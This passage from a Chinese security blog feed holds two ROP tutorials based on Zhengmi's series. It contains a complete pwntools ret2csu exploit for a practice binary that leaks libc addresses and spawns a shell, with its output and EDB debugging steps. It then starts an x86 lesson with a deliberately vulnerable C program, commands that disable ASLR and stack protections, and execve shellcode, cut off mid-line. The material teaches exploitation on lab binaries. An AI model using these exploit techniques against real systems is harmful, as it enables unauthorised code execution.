alt="栈中布局分布图"><br></div><p>这里再说一下，我用objdump反汇编出来的结果，是<code>r13</code>寄存器的值赋值给<code>rdx</code>、<code>r14</code>寄存器的值赋值给<code>rsi</code>、<code>r15</code>的低三十二位赋值给<code>edi</code>，但是蒸米大神文章中是反过来的，一会可以在exp中体现出来，下面是蒸米大神的反汇编结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">........</span><br><span class="line">  4005f0:   4c 89 fa                mov    %r15,%rdx</span><br><span class="line">  4005f3:   4c 89 f6                mov    %r14,%rsi</span><br><span class="line">  4005f6:   44 89 ef                mov    %r13d,%edi</span><br><span class="line">  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)</span><br><span class="line">  4005fd:   48 83 c3 01             add    $0x1,%rbx</span><br><span class="line">  400601:   48 39 eb                cmp    %rbp,%rbx</span><br><span class="line">  400604:   75 ea                   jne    4005f0 &lt;__libc_csu_init+0x50&gt;</span><br><span class="line">  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx</span><br><span class="line">  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp</span><br><span class="line">  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12</span><br><span class="line">  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13</span><br><span class="line">  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14</span><br><span class="line">  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15</span><br><span class="line">  400624:   48 83 c4 38             add    $0x38,%rsp</span><br><span class="line">  400628:   c3                      retq</span><br></pre></td></tr></table></figure><p>我们先构造<code>payload1</code>，利用<code>write()</code>输出<code>write在内存中的地址</code>。注意我们的gadget是call qword ptr [r12+rbx<em>8]，所以我们应该使用<code>write.got</code>的地址<code>而不是write.plt</code>的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要<code>继续覆盖栈上的数据</code>，直到把返回值覆盖成目标函数的<code>main函数</code>为止。这里说一下payload1 += “\x00”\</em>56这句话，当时纠结了很久，思路不是很清晰，没看懂，一直在调试看栈上的这七个数据存的到底是什么，最后发现根本不用关心它存的是什么，不过这些值会存到rbx、rbp、r12….寄存器中，这里覆盖这些值只是为了让程序返回的时候返回的是<code>main</code>的地址，要想覆盖那个地址就要覆盖前面栈上的数据。这里可能说的啰嗦了，大佬轻喷，我是小白。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#write(rdi=1,rsi=write_got,rdx=8)</span></span><br><span class="line">payload1 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span>  <span class="comment">#0x38</span></span><br><span class="line">payload1 += p64(main_addr)</span><br></pre></td></tr></table></figure><p>这里看一下覆盖完栈数据后<code>栈上数据的分布</code>：</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-01.png" alt="覆盖数据后栈中数据分布图"><br></div><p>当我们exp在收到<code>write()</code>在内存中的地址后，就可以计算出<code>system()</code>在<code>内存中的地址</code>了。接着我们构造<code>payload2</code>，利用<code>read()</code>将<code>system()的地址</code>以及<code>“/bin/sh”</code>读入到<code>.bss段</code>内存中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#read(rdi=0,rsi=bss_addr,rdx=16)</span></span><br><span class="line">payload2 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br></pre></td></tr></table></figure><p>最后我们构造<code>payload3</code>,调用system()函数执行“/bin/sh”。注意，<code>system()的地址</code>保存在了<code>.bss段首地址</code>上，<code>“/bin/sh”的地址</code>保存在了<code>.bss段首地址+8</code>字节上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#system(rdi=bss_addr+8="/bin/sh\0")</span></span><br><span class="line">payload3 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main_addr)</span><br></pre></td></tr></table></figure><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_got= "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"read_got= "</span> + hex(read_got)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400587</span></span><br><span class="line"></span><br><span class="line">system_off_addr = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_off_addr= "</span> + hex(system_off_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#write(rdi=1,rsi=write_got,rdx=8)</span></span><br><span class="line">payload1 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span>  <span class="comment">#0x38</span></span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n################seding payload1################\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr= "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - system_off_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr= "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#read(rdi=0,rsi=bss_addr,rdx=16)</span></span><br><span class="line">payload2 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">16</span>) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###############seding payload2################\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(system_addr))</span><br><span class="line">p.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=edi=r15, rsi=r14, rdx=r13</span></span><br><span class="line"><span class="comment">#system(rdi=bss_addr+8="/bin/sh\0")</span></span><br><span class="line">payload3 = <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">                <span class="comment">#pop        junk      rbx      rbp         r12           r13         r14           r15          ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x400616</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0x400600</span>)</span><br><span class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n##############seding payload3###############\n"</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>要注意的是，当我们把程序的<code>io重定向</code>到<code>socket</code>上的时候，根据网络协议，因为发送的<code>数据包过大</code>，<code>read()有时会截断payload</code>，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行<code>远程攻击</code>的话，需要保证<code>ping值足够小</code>才行（局域网）。最终执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ python level5_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x03/level5'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x03/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level5'</span>: pid 13296</span><br><span class="line">write_got= 0x601018</span><br><span class="line">read_got= 0x601020</span><br><span class="line">system_off_addr= 0xb1f20</span><br><span class="line"></span><br><span class="line"><span class="comment">################seding payload1################</span></span><br><span class="line"></span><br><span class="line">write_addr= 0x7f14523e92b0</span><br><span class="line">system_addr= 0x7f1452337390</span><br><span class="line"></span><br><span class="line"><span class="comment">###############seding payload2################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##############seding payload3###############</span></span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x05-EDB调试器"><a href="#0x05-EDB调试器" class="headerlink" title="0x05 EDB调试器"></a>0x05 EDB调试器</h3><p>我们在学习Linux ROP的过程中一定少不了调试这一环节，虽然gdb的功能很强大，但命令行界面对很多人来说并不友好。很多学习Windows调试的人用惯了ollydbg再接触gdb的话总感觉很难上手。其实在linux下也有<code>类似于ollydbg</code>的调试工具，那就是<code>EDB-debugger</code>。这里给出edb的下载地址，具体的编译请参考readme：</p><div class="github-widget" data-repo="eteran/edb-debugger"></div><p>下面我们就拿level5做例子来讲解一下如何使用EDB。首先是<code>挂载(attach)进程</code>和<code>设置断点(break point)</code>。我们知道当我们在用exp.py脚本进行攻击的时候，脚本会一直运行，我们并没有足够的时间进行挂载操作。想要进行调试的话我们需要让脚本<code>暂停一下</code>，随后再进行挂载。暂停的方法很简单，只需要在脚本中加一句<code>”raw_input()”</code>即可。比如说我们想在发送payload1之前暂停一下脚本，只需要这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ss = raw_input()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br></pre></td></tr></table></figure><p>这样的话，当脚本运行起来后，就会在<code>raw_input()</code>这一行停下来，<code>等待用户输入</code>。这时候我们就可以<code>启动EDB进行挂载</code>了。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-02.jpg" alt="Attach To Process"><br></div><p>使用<code>EDB进行挂载</code>非常简单，输入进程名点ok即可。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-03.jpg" alt="跳转"><br></div><p>挂载上以后就可以设置断点了。首先在调试窗口按<code>”ctrl + g”</code>就可以<code>跳转</code>到目标地址，我们这里将地址设置为<code>0x400610</code>，也就是<code>第一个gadget</code>的地址。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-04.jpg" alt="设置断点"><br></div><p>接着我们在<code>0x400610</code>这个地址前<code>双击</code>，就可以看到一个<code>红点</code>，说明我们已经<code>成功的下了断点</code>。接着按<code>“F9”</code>或者<code>点击”Run”</code>就可以让程序<code>继续运行</code>了。</p><p>虽然程序继续运行了，但是脚本还在继续等待用户的输入，这时候只需要在命令行<code>按一下回车</code>，程序就会<code>继续运行</code>，随后会暂停在<code>”0x400610”</code>这个断点。</p><div align="left"><br>    <img src="/resources/2018/2018-05-11-05.jpg" alt="运行"><br></div><p>接着我们可以按<code>”F8”</code>或者<code>”F7”</code>进行<code>单步调试</code>，<code>主窗口</code>会显示pc将要执行的指令以及执行后的结果。<code>右边</code>会看到各个寄存器的值。注意，在寄存器（比如说RSP）的值上点击右键，可以选择<code>”follow in dump”</code>，随后就在data dump窗口就能看到这个地址上对应数据是什么了。除此之外，EDB还支持<code>动态修改内存数据</code>，当你选中数据后，可以右键，选择<code>”Edit Bytes”</code>，就可以对选中的数据进行动态修改。</p><p>以上介绍的只是EDB的一些基本操作，在随后的章节中我们还会结合其他例子继续介绍一些EDB的高级用法。</p><h3 id="0x06小结"><a href="#0x06小结" class="headerlink" title="0x06小结"></a>0x06小结</h3><p>可以说ROP最大的艺术就是在于gadgets千变万化的组合了。因为篇幅原因我们准备将如何寻找以及组合gadgets的技巧留到随后的文章中去介绍。欢迎大家到时继续学习。</p><h3 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h3><p>1.<a href="http://wooyun.jozxing.cc/static/drops/tips-2288.html" target="_blank" rel="noopener">64位Linux下的栈溢出</a><br>2.<a href="https://blog.leoc.io/blog/20140414/week4-bigdata-writeup/" target="_blank" rel="noopener">Week4-bigdata-丘比龙版银河系最详细Writeup!</a></p><h3 id="0xFF-版权声明"><a href="#0xFF-版权声明" class="headerlink" title="0xFF 版权声明"></a>0xFF 版权声明</h3><p>本文独家首发于乌云知识库(drops.wooyun.org)。本文并没有对任何单位和个人授权转载。如本文被转载，一定是属于未经授权转载，属于严重的侵犯知识产权，本单位将追究法律责任。</p>]]></content>
      
      <categories>
          
          <category> 备份 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一步一步学ROP之Linux_x86篇-蒸米</title>
      <link href="/2018/05/10/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x86%E7%AF%87-%E8%92%B8%E7%B1%B3/"/>
      <url>/2018/05/10/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux_x86%E7%AF%87-%E8%92%B8%E7%B1%B3/</url>
      <content type="html"><![CDATA[<blockquote><p>这篇博客记录我跟着蒸米大神的文章一步一步学ROP之Linux_x86学习ROP的过程。在进行复现的时候，遇到了一些问题，文章中会提到。<br><a id="more"></a></p></blockquote><h3 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h3><p><code>ROP</code>的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。虽然现在大家都在用64位的操作系统，但是想要扎实的学好ROP还是得从基础的x86系统开始，但看官请不要着急，在随后的教程中我们还会带来linux_x64以及android (arm)方面的ROP利用方法，欢迎大家继续学习。</p><p><code>小编备注</code>:文中涉及代码可在文章最后的github链接找到。</p><h3 id="0x01-Control-Flow-Hijack-程序流劫持"><a href="#0x01-Control-Flow-Hijack-程序流劫持" class="headerlink" title="0x01 Control Flow Hijack 程序流劫持"></a>0x01 Control Flow Hijack 程序流劫持</h3><p>比较常见的<code>程序流劫持</code>就是<code>栈溢出</code>，<code>格式化字符串攻击</code>和<code>堆溢出</code>了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有<code>DEP</code>（堆栈不可执行），<code>ASLR</code>（内存地址随机化），<code>Stack Protector</code>（栈保护）等。但是如果上来就部署全部的防御，初学者可能会觉得无从下手，所以我们先从最简单的没有任何保护的程序开始，随后再一步步增加各种防御措施，接着再学习绕过的方法，循序渐进。</p><p>首先来看这个有明显<code>缓冲区溢出</code>的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们用下列命令进行<code>编译</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure><p>这个命令编译程序。<code>-fno-stack-protector</code>和<code>-z execstack</code>这两个参数会分别关掉<code>Stack Protector(GS、canary)</code>和<code>DEP(NX)</code>。</p><p>同时我们在shell中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s </span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>这几个指令。执行完后我们就关掉整个linux系统的<code>ASLR</code>保护。</p><p>接下来我们开始对目标程序进行分析。首先我们先来确定<code>溢出点</code>的位置，这里我推荐使用<code>pattern.py</code>这个脚本来进行计算。我们使用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pattern.py create 150</span><br></pre></td></tr></table></figure><p>来生成一串测试用的150个字节的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure><p>随后我们使用<code>gdb ./level1</code>调试程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x86/0x01/level1 </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x37654136 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0x97</span><br><span class="line"> EBX  0x0</span><br><span class="line">*ECX  0xffffcd90 ◂— 0x41306141 (<span class="string">'Aa0A'</span>)</span><br><span class="line">*EDX  0x100</span><br><span class="line">*EDI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line">*ESI  0xf7fb4000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */</span><br><span class="line">*EBP  0x65413565 (<span class="string">'e5Ae'</span>)</span><br><span class="line">*ESP  0xffffce20 ◂— 0x41386541 (<span class="string">'Ae8A'</span>)</span><br><span class="line">*EIP  0x37654136 (<span class="string">'6Ae7'</span>)</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x37654136</span><br></pre></td></tr></table></figure><p>我们可以得到<code>内存出错</code>的地址为<code>0x37654136</code>。随后我们使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python pattern.py offset 0x37654136</span><br><span class="line">hex pattern decoded as: 6Ae7</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>就可以非常容易的计算出PC返回值的覆盖点为140个字节。我们只要构造一个<code>”A”*140+ret</code>字符串，就可以让pc执行ret地址上的代码了。</p><p>接下来我们需要一段<code>shellcode</code>，可以用<code>msf生成</code>，或者自己反编译一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># execve (<span class="meta-string">"/bin/sh"</span>) </span></span><br><span class="line"><span class="meta"># xor ecx, ecx</span></span><br><span class="line"><span class="meta"># mul ecx</span></span><br><span class="line"><span class="meta"># push ecx</span></span><br><span class="line"><span class="meta"># push 0x68732f2f   ;; hs<span class="comment">//</span></span></span><br><span class="line"><span class="meta"># push 0x6e69622f   ;; nib/</span></span><br><span class="line"><span class="meta"># mov ebx, esp</span></span><br><span class="line"><span class="meta"># mov al, 11</span></span><br><span class="line"><span class="meta"># int 0x80</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"</span></span><br><span class="line">shellcode += <span 